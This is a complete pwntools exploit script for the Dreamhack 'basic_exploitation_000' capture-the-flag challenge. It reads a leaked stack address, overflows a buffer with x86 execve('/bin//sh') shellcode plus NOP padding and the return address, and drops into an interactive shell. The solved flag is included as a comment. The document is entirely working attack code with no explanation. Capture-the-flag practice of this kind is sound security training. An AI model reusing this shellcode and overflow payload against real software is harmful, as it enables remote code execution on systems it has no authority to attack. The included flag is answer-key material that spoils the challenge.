from pwn import * 

# p = process("./basic_exploitation_000")
p = remote("host1.dreamhack.games",8479)


shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0e\x2c\x03\xcd\x80"

p.recvuntil("0x")
addr = int(p.recv(8),16)
p.recvline()

log.info(hex(addr))
pause()

payload = ""
payload += shell
payload += "\x90"*(0x80-len(shell)+4)
payload += p32(addr)



p.sendline(payload)


p.interactive()

#DH{465dd453b2a25a26a847a93d3695676d}
